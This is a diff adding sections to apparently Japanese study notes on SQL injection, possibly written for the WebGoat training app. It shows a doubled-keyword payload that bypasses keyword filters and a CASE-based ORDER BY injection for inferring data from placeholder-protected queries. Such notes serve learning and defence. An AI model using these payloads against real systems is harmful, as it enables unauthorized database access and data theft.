@@ -89,3 +89,24 @@ SQLでは条件を''で囲むので、条件文にその他の条件を埋め込
 ```sql
 SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/='admin'
 ```
+
+4. キーワードフィルタリング対策
+クエリ内の、SQLキーワードをフィルタリングすることで、サブクエリを禁止する手法。
+```sql
+select * from users where username = 'admin'
+->
+*users where username = 'admin' (キーワードselectとfromがフィルタリングされた)
+```
+このようなフィルタリングに対策するには、キーワードの中にキーワードを差し込み、フィルタリングすることで逆にキーワードを組み立てしてくれるように、キーワードを2重に書くことで、キーワードフィルタリングを突破することができる
+```sql
+seselectlect/**/*/**/frfromom/**/users;--
+->
+select/**/*/**/from/**/users;--
+```
+
+5. Placeholderへの攻撃手法
+SQLインジェクション対策として、placeholderを導入したシステムや、固定値でquery実施しているシステムでも、order byの条件にインジェクションされる可能性がある。
+order byはselect文と組み合わせることもできるので、条件を組み合わせることでサーバの真偽回答でデータを推測することができる
+```sql
+select id, hostname, ip, mac, status, description from servers where status <> 'out of order' order by case when (select ip from servers where hostname = 'webgoat-prd') like '192%' then ip else hostname end
+```
